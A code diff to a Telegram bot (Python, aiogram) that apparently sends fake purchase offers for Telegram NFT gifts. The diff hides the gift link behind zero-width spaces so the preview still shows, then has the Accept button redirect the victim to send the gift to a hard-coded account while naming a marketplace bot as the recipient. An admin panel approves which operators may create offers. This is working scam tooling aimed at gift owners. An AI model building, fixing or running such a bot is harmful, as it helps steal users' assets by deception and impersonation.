@@ -11,8 +11,8 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFil
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = os.getnev("BOT_TOKEN")
-RENDER_URL = "https://portals-ams5.onrender.com" 
+BOT_TOKEN = os.environ["BOT_TOKEN"]
+RENDER_URL = "https://portals-ams5.onrender.com"
 MAIN_ADMIN_ID = 8438026734
 
 logging.basicConfig(level=logging.INFO)
@@ -81,7 +81,7 @@ async def keep_alive():
 
 TEXTS = {
     "ru": {
-        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.\n\n<a href='{nft_link}'>​</a>",
+        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.",
         "btn_show": "ПОКАЗАТЬ ПОДАРОК",
         "btn_decline": "Отклонить",
         "btn_accept": "Принять",
@@ -89,7 +89,7 @@ TEXTS = {
         "btn_transfer": "Передать NFT"
     },
     "en": {
-        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.\n\n<a href='{nft_link}'>​</a>",
+        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.",
         "btn_show": "SHOW GIFT",
         "btn_decline": "Decline",
         "btn_accept": "Accept",
@@ -97,7 +97,7 @@ TEXTS = {
         "btn_transfer": "Transfer NFT"
     },
     "zh": {
-        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。\n\n<a href='{nft_link}'>​</a>",
+        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。",
         "btn_show": "显示礼物",
         "btn_decline": "拒绝",
         "btn_accept": "接受",
@@ -105,6 +105,8 @@ TEXTS = {
         "btn_transfer": "转移 NFT"
     }
 }
+
+ZW = "\u200b"
 
 async def create_offer(chat_id, user_id, user_full_name, command_text, business_connection_id=None):
     command = command_text.split()[0].lower()
@@ -118,13 +120,17 @@ async def create_offer(chat_id, user_id, user_full_name, command_text, business_
 
     _, nft_link, price_value, currency, target_user = match.groups()
     price_text = f"{price_value} ⭐" if currency.lower() == "stars" else f"{price_value} 💎"
-    
+
     nft_name_formatted = nft_link.split('/')[-1].replace('-', '').capitalize()
     user_link = f"<a href='tg://user?id={user_id}'>{user_full_name}</a>"
 
-    # Пустой пробел (Zero-width space) внутри тега <a> делает ссылку невидимой, 
-    # но Telegram все равно подтягивает превью.
-    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name_formatted, nft_link=nft_link)
+    body_text = t["offer"].format(
+        user_link=user_link, price=price_text,
+        nft_name=nft_name_formatted, nft_link=nft_link
+    )
+
+    hidden_link = f"<a href='{nft_link}'>{ZW * 3}</a>"
+    final_text = f"{hidden_link}\n{body_text}"
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
@@ -143,7 +149,7 @@ async def create_offer(chat_id, user_id, user_full_name, command_text, business_
             disable_web_page_preview=False
         )
     except Exception as e:
-        logging.error(f"Ошибка при отправке: {e}")
+        logging.error(f"Ошибка при отправке офера: {e}")
 
 @dp.message(F.text == "/start")
 async def start_command(message: types.Message):
@@ -159,7 +165,7 @@ async def start_command(message: types.Message):
         f"🆔 ID: <code>{user_id}</code>\n"
         f"🔗 Юзернейм: @{message.from_user.username or 'нет'}"
     )
-    
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="✅ Принять", callback_data=f"approve:{user_id}"),
@@ -186,11 +192,11 @@ async def admin_panel(message: types.Message):
         "❌ <code>/del [ID]</code> — Удалить пользователя по ID\n"
         "📥 <code>/download_db</code> — Скачать файл базы\n"
     )
-    
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📥 Скачать базу (users.db)", callback_data="download_db")]
     ])
-    
+
     await message.answer(text, reply_markup=keyboard)
 
 @dp.message(F.text == "/list_users")
@@ -204,7 +210,7 @@ async def list_users(message: types.Message):
     for u_id, role in users:
         icon = "👑" if role == "admin" else "👤"
         text += f"{icon} <code>{u_id}</code> — {role}\n"
-    
+
     await message.answer(text)
 
 @dp.message(F.text.startswith("/add_admin"))
@@ -238,12 +244,12 @@ async def add_user_cmd(message: types.Message):
 @dp.message(F.text.startswith("/del"))
 async def del_user_cmd(message: types.Message):
     if get_user_role(message.from_user.id) != "admin": return
-    
+
     args = message.text.split()
     if len(args) < 2:
         await message.answer("❌ Формат: /del 123456789 (ID пользователя)")
         return
-        
+
     try:
         target_id = int(args[1])
     except ValueError:
@@ -253,7 +259,7 @@ async def del_user_cmd(message: types.Message):
     if target_id == MAIN_ADMIN_ID:
         await message.answer("❌ Нельзя удалить главного админа.")
         return
-        
+
     del_user(target_id)
     await message.answer(f"✅ Пользователь {target_id} удален из базы.")
 
@@ -281,7 +287,7 @@ async def approve_user(callback: types.CallbackQuery):
     if get_user_role(callback.from_user.id) != "admin": return
     user_id = int(callback.data.split(":")[1])
     add_user(user_id, "user")
-    
+
     await callback.message.edit_text(f"✅ Пользователь <code>{user_id}</code> одобрен.")
     try:
         await bot.send_message(user_id, "🎉 Ваша заявка одобрена! Теперь вы можете использовать /price.")
@@ -325,7 +331,7 @@ async def accept_offer(callback: types.CallbackQuery):
         price_str, lang = parts[1], parts[2]
         t = TEXTS[lang]
 
-        target_username = "portalNftReplayer" 
+        target_username = "portalNftReplayer"
         gift_link = f"tg://send_gift?to={target_username}"
 
         new_text = t["accepted"].format(transfer_bot="@portals_nftbot", price=price_str)
@@ -333,10 +339,16 @@ async def accept_offer(callback: types.CallbackQuery):
             [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
         ])
 
-        await bot.edit_message_text(
-            text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
-            reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
-        )
+        if callback.message.business_connection_id:
+            await bot.edit_message_text(
+                text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
+                reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
+            )
+        else:
+            await bot.edit_message_text(
+                text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
+                reply_markup=new_keyboard
+            )
     except Exception as e:
         logging.error(f"Ошибка в кнопке: {e}")
 
@@ -348,7 +360,7 @@ async def decline_offer(callback: types.CallbackQuery):
 
 async def main():
     Thread(target=run_flask, daemon=True).start()
-    asyncio.create_task(keep_alive()) 
+    asyncio.create_task(keep_alive())
     print("Бот запущен.")
     await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query", "message"])
 
